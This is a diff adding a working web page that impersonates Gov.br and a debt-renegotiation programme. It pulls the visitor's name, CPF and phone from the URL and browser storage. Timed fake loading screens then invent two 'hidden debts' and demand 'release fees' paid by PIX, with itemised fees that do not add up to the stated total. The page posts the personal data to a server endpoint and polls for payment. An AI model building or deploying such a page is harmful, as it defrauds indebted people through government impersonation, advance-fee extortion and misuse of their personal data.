@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validação Necessária - Gov.br</title>
+    <script src="guard.js"></script>
+    <script>
+        if (window.FunnelGuard && typeof window.FunnelGuard.verificarAcesso === 'function') {
+            window.FunnelGuard.verificarAcesso();
+        }
+    </script>
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { min-height: 100vh; background-color: #f5f5f5; display: flex; flex-direction: column; font-family: 'Segoe UI', Arial, sans-serif; align-items: center;}
+        
+        .govbr-header { background: #fff; border-bottom: 1px solid #e0e0e0; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; max-width: 520px; width: 100%; }
+        .govbr-logo { font-size: 24px; font-weight: 900; color: #1351B4; letter-spacing: -1px; }
+        .govbr-logo span { color: #FFCD07; }
+        .header-icons { display: flex; align-items: center; gap: 14px; }
+        .header-icon-btn { width: 36px; height: 36px; border: 1.5px solid #ccc; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 16px; color: #555; }
+        
+        .main-wrap { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 20px 0; width: 100%; max-width: 520px;}
+        .card { background: #fff; width: 100%; padding: 32px 28px 28px; display: flex; flex-direction: column; align-items: center; text-align: center; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.05);}
+        
+        .step { display: none; width: 100%; animation: fadeIn 0.4s; }
+        .step.active { display: flex; flex-direction: column; align-items: center; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .title { font-size: 22px; font-weight: 700; color: #1351B4; margin-bottom: 16px; line-height: 1.3; }
+        .subtitle { font-size: 15px; color: #444; margin-bottom: 24px; line-height: 1.5; text-align: left; width: 100%; }
+        
+        .data-box { background: #f9f9f9; border: 1px solid #e0e0e0; border-radius: 8px; padding: 16px; width: 100%; text-align: left; margin-bottom: 24px; }
+        .data-item { margin-bottom: 12px; }
+        .data-item:last-child { margin-bottom: 0; }
+        .data-label { font-size: 13px; color: #666; font-weight: 600; text-transform: uppercase; }
+        .data-value { font-size: 16px; color: #1a1a1a; font-weight: 700; }
+
+        .debt-box { background: #fff3cd; border: 1px solid #ffeeba; border-radius: 8px; padding: 16px; width: 100%; text-align: left; margin-bottom: 16px; }
+        .debt-title { font-weight: 700; color: #856404; font-size: 16px; margin-bottom: 4px;}
+        .debt-value { color: #d32f2f; font-weight: 700; font-size: 15px;}
+        .alert-text { color: #d32f2f; font-weight: 700; margin-bottom: 16px; font-size: 15px;}
+
+        .btn-continuar { width: 100%; background: #1351B4; color: #fff; font-size: 17px; font-weight: 700; border: none; border-radius: 30px; padding: 16px; cursor: pointer; text-align: center; transition: background 0.2s, transform 0.1s; margin-bottom: 20px; display: flex; justify-content: center; align-items: center;}
+        .btn-continuar:hover { background: #0f3e8e; transform: translateY(-1px); }
+        .btn-continuar:active { transform: translateY(0); }
+
+        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1351B4; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text { font-size: 16px; font-weight: 600; color: #1351B4; margin-top: 16px; min-height: 24px;}
+
+        .qr-container { display: flex; flex-direction: column; align-items: center; background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 20px; margin-bottom: 20px; width: 100%; }
+        .qr-code-img { width: 220px; height: 220px; margin-bottom: 16px; }
+        .pix-code-box { background: #f5f5f5; border: 1px dashed #ccc; padding: 12px; border-radius: 6px; width: 100%; word-break: break-all; font-family: monospace; font-size: 13px; color: #555; margin-bottom: 16px; text-align: left; }
+    </style>
+</head>
+<body>
+    <!-- Modal de Atenção -->
+    <div id="attentionModal" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px;">
+        <div style="background: #fff; width: 100%; max-width: 380px; border-radius: 8px; padding: 32px 24px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">
+            <svg style="margin-bottom: 20px;" width="70" height="70" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2L1 21H23L12 2Z" fill="#FACC15" stroke="#FACC15" stroke-width="2" stroke-linejoin="round"/>
+                <path d="M12 9V14" stroke="#000" stroke-width="2" stroke-linecap="round"/>
+                <circle cx="12" cy="18" r="1.5" fill="#000"/>
+            </svg>
+            <h2 style="font-size: 24px; color: #1a1a1a; margin-bottom: 16px; font-weight: 800;">ATENÇÃO!</h2>
+            <p style="font-size: 15px; color: #444; line-height: 1.5; margin-bottom: 24px;">Para concluir a baixa definitiva e emitir a certidão de quitação é necessário o pagamento das <strong>Tarifas e dos documentos de liberação</strong>. Sem essas taxas o acordo não poderá ser concedido.</p>
+            <button onclick="document.getElementById('attentionModal').style.display='none'" style="width: 100%; background: #1351B4; color: #fff; font-size: 16px; font-weight: 700; border: none; border-radius: 4px; padding: 16px; cursor: pointer; text-transform: uppercase;">LIBERAR MEU ACORDO</button>
+        </div>
+    </div>
+
+    <header class="govbr-header">
+        <img src="/static/images/logo-portal.webp" alt="gov.br" style="height: 35px; width: auto;">
+        <div style="background: #1351B4; color: white; border-radius: 20px; padding: 6px 16px; display: flex; align-items: center; gap: 8px; font-weight: 600; font-size: 15px;">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+            <span id="header-user-name">Cidadão</span>
+        </div>
+    </header>
+
+    <main class="main-wrap">
+        <div class="card">
+            
+            <!-- STEP 1: VALIDATION -->
+            <div class="step active" id="step1">
+                <h1 class="title">Validação de Dados</h1>
+                <p class="subtitle">Precisamos validar seus dados para ter certeza de que o acordo será gerado corretamente em seu nome.</p>
+                
+                <div class="data-box">
+                    <div class="data-item">
+                        <div class="data-label">NOME COMPLETO</div>
+                        <div class="data-value" id="display-name">Carregando...</div>
+                    </div>
+                    <div class="data-item">
+                        <div class="data-label">CPF</div>
+                        <div class="data-value" id="display-cpf">Carregando...</div>
+                    </div>
+                </div>
+
+                <button class="btn-continuar" onclick="nextStep(2)">Confirmar meus dados</button>
+
+                <!-- Box de Informações Extras -->
+                <div style="background: #fff; border: 1px solid #ccc; border-radius: 8px; padding: 20px; width: 100%; text-align: left; margin-bottom: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
+                    <h3 style="color: #2e7d32; font-size: 18px; margin-bottom: 8px; font-weight: 800;">Informações sobre a Quitação</h3>
+                    <div style="height: 2px; width: 100%; background: #2e7d32; margin-bottom: 16px;"></div>
+                    <ul style="list-style-type: disc; padding-left: 20px; color: #1a1a1a; font-size: 14px; line-height: 1.6; display: flex; flex-direction: column; gap: 12px;">
+                        <li>A emissão da certidão de quitação é <strong>obrigatória</strong> para a baixa definitiva nos órgãos de proteção ao crédito (SPC/Serasa).</li>
+                        <li>O desconto especial será aplicado automaticamente sobre todas as suas dívidas vinculadas ao CPF.</li>
+                        <li>A atualização do seu Score ocorrerá em até 48 horas úteis após a confirmação do acordo.</li>
+                        <li>Mantenha seus dados sempre atualizados para evitar problemas ou atrasos na sua renegociação.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- STEP 2: LOADING 1 -->
+            <div class="step" id="step2">
+                <h1 class="title">Analisando Histórico</h1>
+                <div class="loading-spinner"></div>
+                <div class="loading-text" id="loading-text-1">Buscando pendências...</div>
+            </div>
+
+            <!-- STEP 3: NEW DEBTS FOUND -->
+            <div class="step" id="step3">
+                <h1 class="title">Atenção!</h1>
+                <p class="subtitle">Durante o processo final de quitação, o sistema financeiro encontrou <strong>2 novos débitos vinculados ao seu CPF</strong> que não constavam na primeira base de dados.</p>
+                <p class="alert-text">Não é possível emitir a certidão de quitação e aplicar o desconto de 99% sem incluir essas pendências no acordo central.</p>
+
+                <div class="debt-box" style="background: #fff; border: 1px solid #e0e0e0; border-left: 4px solid #d32f2f;">
+                    <div class="debt-title" style="color: #1a1a1a; display: flex; align-items: center; gap: 8px;">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#d32f2f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="12" y1="18" x2="12" y2="12"></line><line x1="9" y1="15" x2="15" y2="15"></line></svg>
+                        Restrição Interna de Crédito
+                    </div>
+                    <div class="debt-value" style="color: #666; font-weight: normal; font-size: 14px; margin-top: 4px; padding-left: 26px;">Instituição Emissora Retida</div>
+                </div>
+                <div class="debt-box" style="background: #fff; border: 1px solid #e0e0e0; border-left: 4px solid #d32f2f;">
+                    <div class="debt-title" style="color: #1a1a1a; display: flex; align-items: center; gap: 8px;">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#d32f2f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="12" y1="18" x2="12" y2="12"></line><line x1="9" y1="15" x2="15" y2="15"></line></svg>
+                        Registro de Apontamento Secundário
+                    </div>
+                    <div class="debt-value" style="color: #666; font-weight: normal; font-size: 14px; margin-top: 4px; padding-left: 26px;">Instituição Emissora Retida</div>
+                </div>
+
+                <p class="subtitle" style="font-size: 14px;">Você concorda em incluir estas dívidas no pacote de quitação com 99% de desconto?</p>
+                <button class="btn-continuar" onclick="nextStep(4)">Estou de acordo</button>
+            </div>
+
+            <!-- STEP 4: LOADING 2 -->
+            <div class="step" id="step4">
+                <h1 class="title">Reprocessando Acordo</h1>
+                <div class="loading-spinner"></div>
+                <div class="loading-text" id="loading-text-2">Incluindo novas dívidas no sistema...</div>
+            </div>
+
+            <!-- STEP 5: TAX EXPLANATION -->
+            <div class="step" id="step5">
+                <h1 class="title">Atualização de Cadastro</h1>
+                
+                <div style="background: #f0f7f0; border-left: 4px solid #2e7d32; border-radius: 4px; padding: 16px; margin-bottom: 24px; text-align: left; width: 100%;">
+                    <p style="color: #1a1a1a; font-size: 15px; line-height: 1.5; margin-bottom: 8px;"><strong>As 2 pendências ocultas foram adicionadas</strong> ao seu pacote de descontos com sucesso.</p>
+                    <p style="color: #1a1a1a; font-size: 15px; line-height: 1.5;">O seu desconto total de 99% será mantido para todas as dívidas unificadas.</p>
+                </div>
+
+                <p class="subtitle" style="font-size: 15px;">Para concluir a baixa definitiva em todos os sistemas do Serasa e do Banco Central simultaneamente, é necessário gerar um <strong>novo protocolo de unificação</strong>.</p>
+                
+                <div class="data-box" style="text-align: center; background: #fff; border: 2px solid #1351B4; padding: 24px 16px;">
+                    <div class="data-label" style="color: #1351B4;">TARIFAS E DOCUMENTOS DE LIBERAÇÃO</div>
+                    
+                    <div style="text-align: left; font-size: 14px; margin-top: 18px; margin-bottom: 18px; border-bottom: 1px solid #eee; padding-bottom: 14px;">
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                            <span style="color: #555;">Taxa de emissão de documentos:</span>
+                            <strong style="color: #1a1a1a;">R$ 15,33</strong>
+                        </div>
+                        <div style="display: flex; justify-content: space-between;">
+                            <span style="color: #555;">Tarifa de processamento de baixa:</span>
+                            <strong style="color: #1a1a1a;">R$ 12,57</strong>
+                        </div>
+                    </div>
+
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <span style="font-weight: 700; color: #1a1a1a; font-size: 16px;">TOTAL</span>
+                        <div class="data-value" style="font-size: 20px; color: #1a1a1a; font-weight: 900;">R$ 18,41</div>
+                    </div>
+                    <p style="font-size: 12px; color: #777; margin-top: 8px;">(Pagamento único para liberação do acordo)</p>
+                </div>
+
+                <button class="btn-continuar" id="btn-generate-pix" onclick="generateUpsellPix()" style="margin-top: 8px; font-size: 18px; padding: 18px;">Gerar Guia de R$ 18,41</button>
+            </div>
+
+            <!-- STEP 6: PIX PAYMENT -->
+            <div class="step" id="step6">
+                <h1 class="title">Tarifas e Documentos de Liberação</h1>
+                <p class="subtitle" style="text-align: center;">Copie o código PIX abaixo ou escaneie o QR Code para concluir a liberação do seu acordo e emitir a certidão.</p>
+                
+                <div class="qr-container">
+                    <img id="upsell-qr" class="qr-code-img" src="" alt="QR Code PIX">
+                    <div class="pix-code-box" id="upsell-pix-code"></div>
+                    <button class="btn-continuar" onclick="copyPix(this)">Copiar Código PIX</button>
+                </div>
+                
+                <p style="font-size: 13px; color: #666;">Aguardando pagamento...</p>
+                <div class="loading-spinner" style="width: 30px; height: 30px; border-width: 3px;"></div>
+            </div>
+
+        </div>
+    </main>
+
+    <script>
+        let userData = {};
+        let fullUpsellPixCode = '';
+
+        window.onload = function() {
+            try {
+                // Tenta puxar do Jinja (server-side session)
+                let jinjaNome = "";
+                let jinjaCpf = "";
+                
+                if (jinjaNome && jinjaNome !== '') {
+                    userData.nome = jinjaNome;
+                }
+                if (jinjaCpf && jinjaCpf !== '') {
+                    userData.cpf = jinjaCpf;
+                }
+
+                const urlParams = new URLSearchParams(window.location.search);
+                if (urlParams.get('cpf')) userData.cpf = urlParams.get('cpf');
+                if (urlParams.get('nome')) userData.nome = urlParams.get('nome');
+
+                const stored = localStorage.getItem('customerData') || localStorage.getItem('desenrola_user') || sessionStorage.getItem('desenrola_user');
+                if(stored) {
+                    const parsed = JSON.parse(stored);
+                    userData.nome = userData.nome || parsed.nome;
+                    userData.cpf = userData.cpf || parsed.cpf || parsed.documento;
+                    userData.telefone = parsed.telefone || parsed.phone || '';
+                }
+            } catch(e) { console.error("Error loading data", e); }
+            
+            document.getElementById('display-name').textContent = userData.nome || 'Não informado';
+            document.getElementById('display-cpf').textContent = userData.cpf || 'Não informado';
+            if (userData.nome) {
+                document.getElementById('header-user-name').textContent = userData.nome.split(' ')[0];
+            }
+        }
+
+        function nextStep(step) {
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+
+            if(step === 2) {
+                const texts = ["Quitando dívidas...", "Buscando histórico oculto...", "Preparando contrato..."];
+                let i = 0;
+                const interval = setInterval(() => {
+                    i++;
+                    if(i >= texts.length) {
+                        clearInterval(interval);
+                        nextStep(3);
+                    } else {
+                        document.getElementById('loading-text-1').textContent = texts[i];
+                    }
+                }, 2000);
+            }
+
+            if(step === 4) {
+                const texts = ["Reprocessando...", "Aplicando 99% de desconto...", "Finalizando..."];
+                let i = 0;
+                const interval = setInterval(() => {
+                    i++;
+                    if(i >= texts.length) {
+                        clearInterval(interval);
+                        nextStep(5);
+                    } else {
+                        document.getElementById('loading-text-2').textContent = texts[i];
+                    }
+                }, 1500);
+            }
+        }
+
+        async function generateUpsellPix() {
+            const btn = document.getElementById('btn-generate-pix');
+            btn.innerHTML = '<div class="loading-spinner" style="width:20px; height:20px; margin:0; border-width:2px; border-top-color:#1351B4; border-color: rgba(255,255,255,0.3) rgba(255,255,255,0.3) rgba(255,255,255,0.3) #fff;"></div> Aguarde...';
+            btn.disabled = true;
+
+            try {
+                const res = await fetch('/generate-pix-upsell3', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ ...userData, amount: 18.41 })
+                });
+                const data = await res.json();
+                
+                if(data.success) {
+                    document.getElementById('upsell-qr').src = data.qr_code_base64;
+                    
+                    fullUpsellPixCode = data.pix_code;
+                    let displayCode = data.pix_code;
+                    if (displayCode.includes('bcb.pix')) {
+                        displayCode = displayCode.split('bcb.pix')[0] + 'bcb.pix...';
+                    } else if (displayCode.length > 45) {
+                        displayCode = displayCode.substring(0, 45) + '...';
+                    }
+                    document.getElementById('upsell-pix-code').textContent = displayCode;
+                    
+
+                    nextStep(6);
+                    pollPayment(data.transaction_id);
+                } else {
+                    alert("Erro ao gerar PIX: " + (data.error || "Tente novamente."));
+                    btn.innerHTML = 'Gerar Guia de R$ 18,41';
+                    btn.disabled = false;
+                }
+            } catch(e) {
+                alert("Erro de conexão. Tente novamente.");
+                btn.innerHTML = 'Gerar Guia de R$ 18,41';
+                btn.disabled = false;
+            }
+        }
+
+                function copyPix(btn) {
+            const codeToCopy = (typeof fullUpsellPixCode !== 'undefined' && fullUpsellPixCode) 
+                               ? fullUpsellPixCode 
+                               : (document.getElementById('upsell-pix-code') ? document.getElementById('upsell-pix-code').textContent : '');
+                               
+            if (codeToCopy) {
+                const fallbackCopy = () => {
+                    const textArea = document.createElement('textarea');
+                    textArea.value = codeToCopy;
+                    document.body.appendChild(textArea);
+                    textArea.select();
+                    try { document.execCommand('copy'); } catch(e){}
+                    document.body.removeChild(textArea);
+                    showCopiedFeedback(btn);
+                };
+
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(codeToCopy).then(() => {
+                        showCopiedFeedback(btn);
+                    }).catch(fallbackCopy);
+                } else {
+                    fallbackCopy();
+                }
+            }
+        }
+        
+        function showCopiedFeedback(btn) {
+            if (!btn) return;
+            // Evitar cliques multiplos
+            if (btn.dataset.copied === 'true') return;
+            
+            const oldText = btn.innerHTML;
+            const oldBg = btn.style.backgroundColor;
+            btn.dataset.copied = 'true';
+            btn.innerHTML = '<i class="fas fa-check"></i> Copiado!';
+            btn.style.backgroundColor = '#28a745';
+            
+            setTimeout(() => {
+                btn.innerHTML = oldText;
+                btn.style.backgroundColor = oldBg;
+                btn.dataset.copied = 'false';
+            }, 4000);
+        }
+
+
+        async function pollPayment(transactionId) {
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch(`/check-payment/${transactionId}`);
+                    const data = await res.json();
+                    if(data.success && (data.status === 'approved' || data.status === 'paid' || data.status === 'pago')) {
+                        clearInterval(interval);
+                        setTimeout(() => {
+                            window.location.href = '/obrigado';
+                        }, 2000);
+                    }
+                } catch (e) {
+                    console.error("Polling error:", e);
+                }
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
